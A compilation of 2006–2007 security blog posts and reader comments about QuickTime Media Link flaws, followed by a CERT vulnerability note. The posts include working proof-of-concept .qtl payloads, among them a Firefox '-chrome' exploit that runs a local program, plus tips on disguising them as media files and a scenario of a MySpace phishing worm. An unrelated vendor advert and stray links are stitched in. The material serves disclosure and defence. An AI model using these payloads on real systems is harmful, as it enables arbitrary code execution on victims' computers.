# MySpace QuickTime Worm Follow-up

Thu, 07 Dec 2006 03:05:27 GMTby
[pdp](/members/pdp.html)

[MySpace was hit by a worm](http://www.websense.com/securitylabs/alerts/alert.php?AlertID=708) in a semi-automatic manner. This time the worm propagated via a [QuickTime flaw found a couple of months ago](/blog/backdooring-quicktime-movies). This shouldn't be a surprise to anyone. It is quite serious that this attack vector was picked up by Apple so late.

In this post I am not going to explain how this particular MySpace hack works but rather to send a reminder to the security community that [another](/blog/backdooring-mp3-files) QuickTime XSS vector was found right after the first one. This vector can be used in a similar way although, IMHO, the impact is greater. I guess Apple should fix both issues NOW: we don't want MySpace worms spreading around again, although this is very utopic to say.

Here is a brief reminder of what the XSS issue was all about.

> The problems is caused by a quite useful feature called QuickTime Media Link (.qtl). The whole point of these QuickTime Media Link files is to provide means of playing media files in a more accessible way. In this respect the developer can create a .qtl file which holds information about the media content that needs to be played plus recommended dimensions, accessibility features, control features etc...

> .qtl files can contain malicious JavaScript code that can takeover some important network device when executed for [example](https://chatbotkit.com/examples). That's not the end of the story though. Because of its flexibility QuickTime doesn't mind if Media Link (.qtl) files end with .mp3, .mp4, .m4a or even .mov extension...

> This is a quite big problem especially in default configurations of iTunes. The iTunes installation wizard installs the QuickTime player and QuickTime browser plugins and associates various media files with its components. If you open an mp3 file from the desktop it will be played in iTunes player by default, however if you open it from some website it will be played in the QuickTime player browser plugin. In this respect, users who are previewing mp3 and other media files from the Internet are vulnerable.

> [GNUCITIZEN » Backdooring MP3 Files](/blog/backdooring-mp3-files)

To sum up, and put into context, attackers can use QuickTime Media Links to imitate popular media files and as such trick the user into opening malicious content that could lead to their (MySpace) account or their browser being compromised. Lets look at the following hypothetical situation:

> Evil Hacker decides to overtake MySpace in order to DoS google.com. He/she finds that MySpace allows users to supply links in their posts and comments. He spends some time to research the 1000 most popular MySpace members where he will post links to media files titled orgy.mov or myconfession.mp3 or even prankster.avi. Once an unaware user clicks on the link, a phishing page is presented asking the current user to enter their MySpace details to see the private content. If the user is tricked, their credentials will be on their way to the specifically designed for that operation collection point where another automatic process overtakes their user account installing the same malicious file or simply hijack other media files by wrapping them up in QuickTime Media Links the same way it is described in the article mentioned above. The process repeats when another users falls into the trap. When enough number of accounts are compromised Evil Hacker will launch his/her DDoS against Google's AdSense server farm.

*This is it!*

![Nick DImopoulos](//gravatar.com/avatar/4182afa58f053a36f8428d008e99b8be?s=256&d=retro)Nick DImopoulosI joined Myspace just over a week ago now and I got a message saying that it was found that my system had QUICKTIME PLAYER and that I neede an update in order to watch movies.
I stupidly installed it thinking this message was coming from the techs at myspace. A day or so later mt windows XP shut down - blue screen saying it closed down and some figures etc. It did so a few times and then I concentrated where I was on the web when it stopped. Well it is everytime I go to Myspace site. Not necessarily into my account but even if I'm just browsing at Myspace window XP stopps with an error message.
Exasperating stuff. Is there any I can do to overcome or rid me of this problem?
Thanks
Nick D
Where can I read a response to this? Can someone email me please.![Nick DImopoulos](//gravatar.com/avatar/4182afa58f053a36f8428d008e99b8be?s=256&d=retro)Nick DImopoulosI know where to read a response - pardon my ignorance![A](//gravatar.com/avatar/090c89902a3b8d3e50e5106b065491a6?s=256&d=retro)Ai didnt click on any quicktime thingy. but i get an error page whenever i try to log on to myspace. i can browse but i cant click on anyones pics/ comments ect .....i get a server error/systems error page everytime. I have to go to internet cafs to log on now. I tried using a different server but still the same thing.I'm on a mac, so its very doubtful its a virus...if anyone has any clues, they would be much appreciated!![Ciel](//gravatar.com/avatar/6ebbe11f22d848de6d8706d2fd917f71?s=256&d=retro)Cieli get plagued by phished people everyday. even ads that are less then legal. quiet a majority of the phished people i encounter actually still have access to there account, and are unaware that some phisher is sending ads around to there friends, i would certainly hate to find out that im in trouble because a phisher was making my accouunt send ilegal ads out to everyone.
all phishing sites where they ask for your login to steal dont actually say http://www.myspace.com
but they usually look extremely similar. such as
http://www.rnyspace.com
system errors caused by a website are virtually impossible without C++. and C++ cant just be used normally like html or java in the first place. You may want to consider the possibility of a virus or major program corruption, such as quicktime is corrupted.
i would just like to point out that a mac is much more insecure then a windows machine. ive worked with macs before and they are pathetic security wise. windows recieves probrably 80/100 bad hacker being the leading computer in the market, i think mac would crash and burn in windows place right now.
in other words its in your best interest to have good virus protection on a mac too.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Backdooring MP3 Files

Wed, 20 Sep 2006 21:39:18 GMTby
[pdp](/members/pdp.html)

Recently I published information on how specially crafted HTML ([remote](/blog/backdooring-web-pages) and [local](/blog/web-pages-from-hell)), [Flash](/blog/backdooring-flash-objects) and [QuickTime (.mov)](/blog/backdooring-quicktime-movies) files can be used by malicious users to target and exploit internal and external networks. Than my friend and college [David K](http://michaeldaw.org) released his findings on [backdooring PDF](http://michaeldaw.org/md-hacks/backdooring-pdf-files/) documents via builtin Adobe Reader JavaScript features. Also, [JavaScript malware via Google AJAX Search API](/blog/google-search-api-worms) seams to be possible and could affect many popular web products. As Billy Hoffman said "XSS is the new hotness!". I cannot agree more on that.

### MP3 Files can be Backdoored with Malicious Content too

Over the past few days I have been exploring different features of Apple's QuickTime player - key software component of iTunes and standard part of many home and business workstations. A lot of research was conducted and some problems, which IMHO are quite serious, were found. Please take this post as a security notice.

QuickTime is quite versatile and flexible media platform which has a lot of functionalities. I quite like it, I must say. I even use iTunes on a daily basis. Unfortunately because of its flexibility QuickTime seams to allow execution of malicious content in a form of JavaScript from media files such as mp3, mp4, m4a and everything else that is supported.

The problems is caused by a quite useful feature called QuickTime Media Link (.qtl). The whole point of these QuickTime Media Link files is to provide means of playing media files in a more accessible way. In this respect the developer can create a .qtl file which hold information about the media content that needs to be played plus recommended dimensions, accessibility features, control features etc. QuickTime Media Link files are written in XML and end typically end with .qtl. A .qtl file in its very basic form looks like the following:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="Sample.mov" autoplay="true"/>
```

The most important element in this XML is called `embed`. This element describes the content that needs to be played. There are quite few attributes that can be assigned to the `embed` element like `src` and `autoplay` but they are not as interesting as `qtnext`. The `qtnext` attribute specifies what needs to be played next. Because `qtnext` expects a URL as an input, .qtl files are capable of opening HTML pages, local files, FTP sites and JavaScript code in the current browser. As such, `qtnext` allows successful backdooring any .qtl file with malicious JavaScript logic. Here it is an [example](https://chatbotkit.com/examples):

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('backdoored')"/>
```

Upon execution the media link presented above will display a harmless message to the user. Keep in mind that a lot more dangerous things can be done. For more information about the impact of such an attack check the [AttackAPI](/blog/attackapi) - a toolkit designed to test browser related issues.

To sum up, .qtl files can contain malicious JavaScript code that can takeover some important network device when executed for example. That's not the end of the story though. Because of its flexibility QuickTime doesn't mind if Media Link (.qtl) files end with .mp3, .mp4, .m4a or even .mov. For example the following XML can be saved as .mp3 and once opened in QuickTime a harmless message will be prompted to the user:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="http://example.com/path/to/real/song.mp3" autoplay="true" qtnext="javascript:alert('hello from backdoor')"/>
```

This is a quite big problem especially in default configurations of iTunes. The iTunes installation wizard installs the QuickTime player and QuickTime browser plugins and associates various media files with its components. If you open a mp3 file from the desktop it will be played in iTunes player by default, however if you open it from some website it will be played in the QuickTime player browser plugin. In this respect, users who are previewing mp3s and other media files from the Internet are vulnerable.

For the sole purpose of demonstrating how this vulnerability works I composed a quite simple and harmless proof of concept. There are two links to mp3 files at the bottom of this page. Two of these files are backdoored. One of them is a tune I composed many years ago.

1. [backdoored.mp3](/files/2006/09/backdoored.mp3) - executes javascript immediately
2. [jamesbond-overdrive-backdoored.mp3](/files/2006/09/jamesbond-overdrive-backdoored.mp3) - executes javascript at the end
3. [jamesbond-overdrive.mp3](/files/2006/09/jamesbond-overdrive.mp3) - the real tune

I mentioned earlier that .qtl files can end with .mov, .avi or even .asf extensions. This means that users can be fooled into executing malicious JavaScript content not only through mp3.

There is one more thing that is quite important to point in this article. JavaScript opened from QuickTime is executed in the browser local context. This attack is also know as [Cross-context scripting](/blog/cross-context-scripting). In Firefox the context is `about:blank`. I am not quite familiar with `about:blank` but my understandings are that everything from `about:*` can request special privileges that will be granted without warning the user. If this the case malicious JavaScript will not only be able to read the local file system but also to alter it. This feature might be used to spread worms that go far beyond the traditional Cross-site Scripting attack.

So basicly anything played in quicktime can be backdored? So basicly this is a quicktime problem. I am not an iTunes user but if you say that quicktime gets installed with it and used has default for several media files then it gets a bit scary :S
I personly only use quicktime(not actual quicktime but the alternative codecs) when i can't use anything else, but i believe most persons would use quicktime to play everything if its the default player.
PS: I just tryed the files number 1 and 2 and they won't open (say the files are corrupt) in winamp nor media player classic nor foobar2000, so i guess backdoring a mp3 file makes it only open in quicktime.
keep posting mate![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpAllan, I don't know about MACs. However I am almost sure that it must work. Maybe I should get a MAC from somewhere and start playing with it.
nrg, yes it affects QuickTime and everything else that is based on it. As long as your applications can read QuickTime Media Links and it supports the `qtnext` attribute of the `embed` element, then you are vulnerable.
QuickTime is associated with .mov files mainly and several other formats. However if you have iTunes installed any .mp3 link will open the QuickTime browser plugin. I have tested it on a default installation of iTunes.![David Kierznowski](//gravatar.com/avatar/1d95d2324345e3dd2e41d6066cc1b492?s=256&d=retro)David Kierznowskipdp,
This doesn't seem to affect v6.5 default install. This is odd as I can see support for qtnext back in version 5. However, it does affect the latest version when I tested it.![Carsten Eilers](//gravatar.com/avatar/abd931e5b40e5c82cf649e8c3d17556f?s=256&d=retro)Carsten EilersHi,
I tested the first two .mp3 on my Mac (Mac OS X 10.3.9 with Safari 1.3.2 and Quicktime Player 7.1.3)
Result:
In Safari: Both demos are working, an alertbox opens
In Quicktime Player: Opens and "plays" the files, but nothing else happens
In iTunes 7.0: Doesn't open the files

# 0DAY QuickTime pwns Firefox

Wed, 12 Sep 2007 12:05:53 GMTby
[pdp](/members/pdp.html)

It seams that QuickTime media formats can cause Firefox to misbehave. The result of this vulnerability can lead to full compromise of the browser.

Before we move on, I have to say a few things. Last year I disclosed two QuickTime vulnerabilities [here](/blog/backdooring-quicktime-movies/) and [here](/blog/backdooring-mp3-files/). The first vulnerability was fixed but the second one was completely ignored. I tried to bring the spot light on the second vulnerability one more time over [here](/blog/myspace-quicktime-worm-follow-up) without much of success. So, I decided to post a demonstration of how a *Low risk* issue can be turned into a very easy to perform **HIGH risk** attack when technology change.

The exploit is rather simple. But first, here is a simple QTL file which instructs the browser to display a friendly `alert('whats up...')` message on the screen:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('whats up...')"/>
```

The most interesting thing about this simple XML file is that we can save it with QuickTime supported extension in order to mislead the user. If you check about:plugins under Firefox, you will see that QuickTime supports several media formats. We can use the audio and video formats only. This means that you can paste the above code into files with extensions: `3g2, 3gp, 3gp2, 3gpp, AMR, aac, adts, aif, aifc, aiff, amc, au, avi, bwf, caf, cdda, cel, flc, fli, gsm, m15, m1a, m1s, m1v, m2a, m4a, m4b, m4p, m4v, m75, mac, mov, mp2, mp3, mp4, mpa, mpeg, mpg, mpm, mpv, mqv, pct, pic, pict, png, pnt, pntg, qcp, qt, qti, qtif, rgb, rts, rtsp, sdp, sdv, sgi, snd, ulw, vfw, wav` and others.

Enough theory, let's see some action. For more information, just read [this](/blog/backdooring-mp3-files/) blog post. The exploit that gains chrome privileges looks like this:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="a.mp3" autoplay="true" qtnext="-chrome javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);"/>
```

In practice I can do anything with the browser. However, just for the sake of this demonstration, I simply open **calc.exe**.

If you dare to try this in your browser, here is a list of a few files you have to click on. They are not malicious. You have my word: [qt-poc-01.mp3](/files/2007/09/qt-poc-01.mp3), [qt-poc-02-shutdown-dont-click.mp3](/files/2007/09/qt-poc-02-shutdown-dont-click.mp3), [qt-poc-03.mpeg](/files/2007/09/qt-poc-03.mpeg), [qt-poc-04.mov](/files/2007/09/qt-poc-04.mov), [qt-poc-05.avi](/files/2007/09/qt-poc-05.avi).

*BTW, QuickTime comes by default with iTunes. Therefore, iTunes users are most affected, I believe.*

i thought for sure that I would be safe since I have never installed quicktime and instead use quicktime alternative (http://www.codecguide.com/download\_qt.htm), but alas, these exploits work even against quicktime alternative....

Apple are useless, the only way to get them to do anything is to make it public. They either don't acknowledge vulnerabilities or deny there is even a problem. I suggest changing your wait time to about 1 month.![pagvac](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)pagvacNice one dude.

This is due to the tightened security policies IE implements for local zone scripts.![Tonu Samuel](//gravatar.com/avatar/b1ae202137780b6bd20c9cbef9bb16c5?s=256&d=retro)Tonu SamuelI wonder if Googlebot accesses this "qt-poc-02-shutdown-dont-click.mp3" link does it also shuts google down or bot only? lol :)![31d1](//gravatar.com/avatar/94fda2e8a3794a888f4a9273aadd5d2e?s=256&d=retro)31d1Yeah, googlebot would definitely open that in quicktime while running Firefox.![Jeff](//gravatar.com/avatar/0b6cabe7eed95ed6ba3d41f78afee0e2?s=256&d=retro)JeffNot one of these links actually worked on my XP machine, using Opera. This is not a bug in Quicktime, its shitty browsers. You can't seriously suggest that a media play mechanism should decide which URLs are safe and which are not - that is 100% the problem of the browser.![Giorgio Maone](//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&d=retro)Giorgio MaoneGecko browsers + NoScript are immune, no matter if the attacker site is whitelisted or not.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictGreat work!

By default Quicktime opens the links in Safari, even if this page is opened in Firefox. You need to set default browser to FF also. Having done so, clicking on links presents a cross-site scripting warning from FF, that the script you are running may be trying to trick you. Accepting this gives a file not found from Mozilla - possibly they gave taken something down??
I really wanted to see if the native protection against installed software would kick in, or be bypassed.
That said, it doesn't matter if OS X is protected, given that most Quicktime installs are on Windows XP boxes running iTunes.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictIs it possible to run "directly" like `file.initWithPath('c:\\windows\\system32\\cmd.exe /c echo x & run notepad.exe & etc')`? I'm not sure if it can be done but would be much easier to execute code without writing 'firefox backdoors' in 'chrome zone'...![bugstomper](//gravatar.com/avatar/22fc1c7723fac43404decfa835c7797d?s=256&d=retro)bugstomperFirefox 2.0.0.6 under MacOS 10.4.10, the links result in an alert saying You are attempting to login to site mozilla.org with username chrome%20javascript but the site does not require authentication. Ths may be an attempt to trick you. Is that the site you really want to visit? (I'm paraphrasing the alert warning from memory)
Even if I do click Yes on that alert then Firefox tries to open a URL on http://mozilla.org, not a local file or chrome type URL or whatever you are trying to do as an exploit, and all that results is a 404 file not found.
So it appears that Firefox on the Mac is not vulnerable to this after all.![dbacon](//gravatar.com/avatar/9e76e2f4d28c9b303eacdaf670e5b6a9?s=256&d=retro)dbaconIt doesn't work if you have Quicktime alternative installed.![clorox](//gravatar.com/avatar/3953332dce3c112a76e7287d55dce3ab?s=256&d=retro)cloroxnice pdp![Hawkuletz](//gravatar.com/avatar/9b535e633d32e23e2dd327dbeb7b6fe7?s=256&d=retro)HawkuletzDoesn't work on my Mac (Mac OS 10.4.10, Firefox 2.0.0.6 and Quicktime 7.2)
So crossplatform exploits are not yet feasible.![chris](//gravatar.com/avatar/5843f6624044d5717ee07d5e87e5516b?s=256&d=retro)chrisI created a file with you POC code in it, named it test.html and opened it in Windows and it didn't do anything. I put in a real mp3 file named a.mp3 and all it did was play the song yet when I click on your links it works fine. Am I missing something?![Crolwey](//gravatar.com/avatar/089c7154da2ebc6562f35c8a8e48c4eb?s=256&d=retro)CrolweyThe exploits does not work if you have installed the NoScript extension, even if you allow JavaScript for gnucitizen.org.
The exploits do work, of course, if you allow all sites to use JavaScript, i.e. deactivate NoScript.![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bkinterestingly, when you try these exploits in Firefox on a Macbook Pro, it launches Safari, and pops up Mozilla.org 404 page.
the exploits did not work for me on a XP2 system, even after disabling noscript. but I am using a limited user account, so maybe that makes a diff?![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bki also tried the exploit in an Windows XP SP2 system using IE7, and it did not work. but again, I was testing using a limited user account, though I don't know if that makes any difference![dave](//gravatar.com/avatar/2a8e46aa4f72a53fbf095557d5eeb4f1?s=256&d=retro)daveWell I've just tried it in a VMWare XP machine, with both firefox, IE7 and Opera clean installs. The exploit started calc.exe on all platforms. Very worrying.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictTo exploit this on IE, firefox must be installed too. IE spawns
```

like all other browsers do [K-Meleon,Opera..]![Sp0oKeR](//gravatar.com/avatar/3c5103f613c394651ced1e7b48eaa66b?s=256&d=retro)Sp0oKeRAwsome Job!!!! Actually it's easy to exploit this stuffs =)!!

Firefox 2.0.0.6 with various Quicktime players on Linux does not do anything. Maybe you should try to do something that is Linux specific here. Of course the bottom line is only the truly ignorant (sadly this means many Microsoft Windows users) and morons browse the net as an administrator user.![Chitiga Georges](//gravatar.com/avatar/10248a415c653d66e26294b19e755098?s=256&d=retro)Chitiga GeorgesI`ve tested the exploit and works on firefox and ie6, on ie7 i get a "error on page"![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bkso short of uninstalling QT, what can users do to protect themselves from this particular sploit?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpI would recommend to install NoScript if you are a Firefox user and switch to Firefox with NoScript if you use any other browser.

I'll keep looking into this...![2rzn](//gravatar.com/avatar/3840755d12928ec3c4b20fc97d781e50?s=256&d=retro)2rznDid not work here. My firefox runs under Xp, and its configured to automatically ask to download files like mp3, mov, avi etc. Its not allowed to automatically launch the player. Seems that that avoids the problem.![Snap](//gravatar.com/avatar/3d77b9db9a47b22398e737207418ab27?s=256&d=retro)Snapit doesnt work here

and use some utf8 encoder if you have long parameters. I still havent managed to get this to write a .bat.

didn't work as supposed. I also tried the javascript used by pocs for the old firelinking bug (http://www.mikx.de/firelinking/), but I didn't get that to work neither.![Brandon](//gravatar.com/avatar/0885eeac949e9492e901de4fcf06483f?s=256&d=retro)BrandonAll these do are throw an error and then open IE, here, the lot of them. FireFox 2.0.0.6, QuickTime 7.2.![l.phoenix](//gravatar.com/avatar/dcb5ed7d46e58ee7652c00926449033e?s=256&d=retro)l.phoenixI think this vulnerability could be used for install trojan and backdoor. It simplify does this by attach a binary file with javascript code, write it to local file and exec it.
So be aware with every media link you click on FF until Mozilla fixes it on FF 2.0.0.7!![Josh Davis](//gravatar.com/avatar/023978f851b7cfee4379e2b1ac24039a?s=256&d=retro)Josh DavisI really wished that would have worked.

"On his blog Petko D. Petkov reported that QuickTime Media-Link files contain a qtnext attribute that could be used on Windows systems to launch the default browser with arbitrary command-line options. When the default browser is Firefox 2.0.0.6 or earlier use of the -chrome option allowed a remote attacker to run script commands with the full privileges of the user. This could be used to install malware, steal local data, or otherwise corrupt the victim's computer."
[...]
"To protect Firefox users from this problem we have now eliminated the ability to run arbitrary script from the command-line. Other command-line options remain, however, and QuickTime Media-link files could still be used to annoy users with popup windows and dialogs until this issue is fixed in QuickTime.
This QuickTime issue appears to be the one described by CVE-2006-4965 but the fix Apple applied in QuickTime 7.1.5 does not prevent this version of the problem."![Ano20070922](//gravatar.com/avatar/5c130acf7891e4093f0bebed57603702?s=256&d=retro)Ano20070922Notes to several other comment posters:
1. This exploit only works if Firefox is the default browser. It doesn't matter what browser you use, only the default browser matters for this one.
2. The example exploits on this page use the security hole to launch some programs that are part of Windows. To test the exploits on Mac, Linux, BSD etc. you would need to change those strings in the exploits to name programs from those systems.
3. Firefox 2.0.0.7 removed the command line option used by these exploits.
4. The real issue is that when QuickTime sees a URL inside a movie or song, it passes the url text to the command line of whatever is the default browser in a way which allows passing arbitrary text to the browser command line. In the old Firefox 2.0.0.6 browser this allowed access to the -chrome option. But any browser whose command line parser can be tricked into doing dangerous stuff from nonsense URLs can be exploited.
5. Firefox 2.0.0.7 is just a stopgap workaround for the specific exploits on this page. The real issue is that the generic "open default browser" action in the operating system and class libraries needs to ensure that whatever is passed on to the browser process is a single argument which does not look like an option or contains spaces or shell metacharacters. I don't have the Quicktime source code, so I don't know which interface they use to pass the qtnext string to the browser. But I am certain that the strings found in the exploits should not have made it through the kind of basic security sanitation filters recommended in GNU/UNIX secure programming tutorials for decades.![trustme](//gravatar.com/avatar/ec38bd253cdd60abe4967a3f4653b0d2?s=256&d=retro)trustmeWell.

## Apple QuickTime remote command execution vulnerability

#### Vulnerability Note VU#751808

Original Release Date: 2007-09-13 | Last Revised: 2007-10-04

---

### Overview

Apple QuickTime contains a vulnerability that may allow an attacker to pass arbitrary commands to other applications.

### Description

| Apple QuickTime is a media player that is available for Microsoft Windows and Apple OS X. Apple QuickTime includes browser plugins for Internet Explorer, Safari, and Netscape-compatible browsers.  QuickTime includes the ability for developers to control how QuickTime movies are launched, what controls are displayed to the user, and other actions. To specify these parameters, developers can create QuickTime link ([.qtl](http://developer.apple.com/quicktime/quicktimeintro/tools/embed2.html)) files. QuickTime link files can be embedded in web pages and launched automatically when a user visits a website.The qtnext parameter can be used in QuickTime link files to specify the url of a multimedia file to load and play. The multimedia file may be hosted on a web page or stored locally.Apple QuickTime incorrectly determines the command line used to launch the default web browser on Microsoft Windows systems. Rather than using the [ShellExecute](http://msdn2.microsoft.com/en-us/library/ms647732.aspx) method, QuickTime determines the default handler for .HTM files and then crafts its own command line for the registered application. Any protective flags in the registered file handler are stripped out by QuickTime.Current proof-of-concept code targets systems where Mozilla Firefox is the default handler for .HTM files. Other applications are also affected by this vulnerability, although the impact may vary based on what command line parameters the application accepts. |
| --- |

### Impact

| By convincing a user to open a specially crafted QuickTime file, a remote, unauthenticated attacker may be able execute arbitrary commands on a vulnerable system. |
| --- |

### Solution

| Apple has released an [update](http://docs.info.apple.com/article.html?artnum=306560) to address this issue. Mozilla has released Firefox [2.0.0.7](http://www.mozilla.org/security/announce/2007/mfsa2007-28.html) which reduces the impact of this vulnerability. |
| --- |

| **Restrict access to QuickTime Movies**Until updates can be applied, the following workarounds may mitigate this vulnerability. Some web sites may allow anonymous users to upload QuickTime movies that exploit this vulnerability. **Workarounds for users**     + *Mozilla has released Firefox* [*2.0.0.7*](http://www.mozilla.org/security/announce/2007/mfsa2007-28.html) *which may prevent exploitation of this vulnerability by removing Firefox's ability to run arbitrary scripts which are provided by command line arguments. Users are encouraged to upgrade as soon as possible.*    + Using the [NoScript](http://noscript.net/) Firefox extension to whitelist web sites that can run scripts and access installed plugins will mitigate this vulnerability. See the NoScript [FAQ](http://noscript.net/features#contentblocking) for more information.    + Running Firefox with a limited user account may prevent an attacker from accessing or overwriting files that the limited user account does not have write access to.  **Workarounds for administrators**    + Proxy servers or intrusion prevention systems may be able to filter QuickTime files and partially mitigate this vulnerability. Note that this workaround is not likely to mitigate or stop all attack vectors. |
